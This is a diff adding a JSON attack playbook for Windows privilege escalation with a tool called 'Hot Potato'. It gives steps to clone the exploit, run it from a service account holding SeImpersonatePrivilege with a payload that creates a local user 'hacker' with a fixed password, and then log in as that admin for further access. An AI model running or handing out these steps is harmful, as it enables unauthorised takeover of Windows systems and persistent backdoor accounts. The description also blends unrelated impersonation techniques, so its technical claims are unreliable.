@@ -1,0 +1,31 @@
+{
+    "name": "Windows Privilege Escalation with Hot Potato",
+    "description": "Abuse named pipe client impersonation and RPCSS to escalate privileges in Windows without relying on DCOM, effective against certain mitigations.",
+    "tools": [
+        {
+            "name": "HotPotato",
+            "description": "Exploit using SMB and RPC for token impersonation in non-SMB signed environments",
+            "url": "https://github.com/jesket/HotPotato"
+        }
+    ],
+    "steps": [
+        {
+            "index": 1,
+            "name": "Download HotPotato",
+            "command": "git clone https://github.com/jesket/HotPotato.git; cd HotPotato/bin/x64 (or x86)",
+            "description": "Clone the repository and select the pre-built binary matching the target architecture for transfer."
+        },
+        {
+            "index": 2,
+            "name": "Run HotPotato Exploit",
+            "command": "./HotPotato.exe 127.0.0.1 \"cmd.exe /c net user hacker Password123 /add\"",
+            "description": "Execute from a service account process with SeImpersonatePrivilege, targeting loopback or a DC, and specify the elevated command payload."
+        },
+        {
+            "index": 3,
+            "name": "Confirm and Leverage",
+            "command": "Check netstat for RPC connections; verify new user with net user",
+            "description": "Monitor for successful impersonation chain; if elevated, log in as the new admin user for further access."
+        }
+    ]
+}
